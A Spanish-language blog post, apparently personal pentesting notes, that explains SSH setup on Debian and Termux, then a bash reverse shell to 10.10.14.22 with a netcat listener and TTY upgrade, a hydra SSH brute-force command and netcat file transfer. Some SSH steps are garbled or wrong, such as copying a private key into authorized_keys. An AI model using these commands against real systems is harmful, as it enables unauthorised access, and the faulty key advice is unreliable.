---
layout: post
author: Sergio Salgado
---

# [](#header-1)Como establecer una conexion remota SSH?

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#about_ssh">Que es SSH?</a>
- <a href="#instalacion">Instalacion</a>
- <a href="#configuracion">Configuracion</a>
- <a href="#conexion">Establecer conexion</a>
- <a href="#conclusiones">Conclusiones</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Es incomodo utilizar la terminal desde algunos dispositivos, o simplemente la interfaz no es como a la que estamos acostumbrados. En este post mostrare como configurar correctamente el servicio de SSH para poder establecer una conexion remota desde otro dispositivo.


## [](#header-2)<a id="about_ssh">Que es SSH?</a>


## [](#header-2)<a id="about_ssh">Instalacion</a>


Para dispositivos con sistema operativo basado en debian


```S
#Actualizacion de sistema
sudo apt update && upgrade
#Instalacion de openssh
apt install openssh
#Para loggearte en una maquina con ssh en ejecusion donde el puerto por default es (22):
ssh user@hostname_or_ip
```

Para dispositivos <a id="andorid">android</a>

```S
pkg upgrade
pkg install openssh
```

## [](#header-2)<a id="about_ssh">Configuracion</a>

Por default la contrasena esta establecida, por lo que ingresaremos a verla con
PrintMotd yes
PasswordAuthentication yes
Subsystem sftp /data/data/com.termux/files/usr/libexec/sftp-server

Para establecer una nueva contrasena


```S
$ passwd
New password:
Retype new password:
New password was successfully set.

```

## [](#header-2)<a id="conexion">Establecer conexion</a>
Para saber el usuario de la maquina donde nos conectaremos

```S
$ whoami
```


```S
#Para usar un puerto en especifico
ssh -p 8022 user@hostname_or_ip
```

Tambien es posible crear en la maquina servifor un archivo dentro de /.ssh/ que se llame authorized_keys, jabra que copiarle la llave privada y asignarle el codigo de permisos 600. La llave se copia dentro de algun directorio de la maquina que se conectara con el nombre de id_rsa y se le pasara el siguiente comando:

```s
#Para uso de llave privada y publica
ssh -i id_rsa user@hostname_or_ip
```

Si hemos olvidado la contrasena e intentamos hacer un bruteforce al servicio de ssh mediante wordlist, podemos usar hydra de la manera siguiente:

```s
hydra -s 22 ssh://192.168.0.100 -L users -P wordlist
```

## [](#header-2)<a id="conclusiones">Conclusiones</a>
Es necesario utilizar muchos dispositivos para alguien que se dedica a la tecnologia, por lo que lo mas practico seria utilizar solo una maquina para poder comunicarnos entre los dispositivos y poder configurarlos.


# [](#header-1)Como hacer una reverse shell?
El comando siguiente hara una peticion de conexion para la ip y puerto asignado:

 ```bash
 #Para ejecutar del lado de la victima
bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Ahora solo hara falta ponerse en escucha con netcat y para que funcione mejor la consola suelo usar tambien el rlwrap 

```s
rlwrap nc -nlvp 443
```

## [](#header-2)<a id="tratamiento tty">Tratamiento para la tty </a>

Para hacer una shell iteractiva:

```s
script /dev/null -c bash
```

Ctrl+Z

```s
stty raw -echo; fg
#ENTER
reset xterm

export TERM=xterm
export SHELL=bash
```

Para las filas

```s
#Consulta de tamano
stty size
45  174
#Para definir
stty rows 45 columns 174
```

# [](#header-1)Envio de datos mediante netcat

```s
#Maquina que envia
nc 10.10.14.22 443 < file_encrypt
#Maquina que recibe
nc -nlvp 4444 > file
```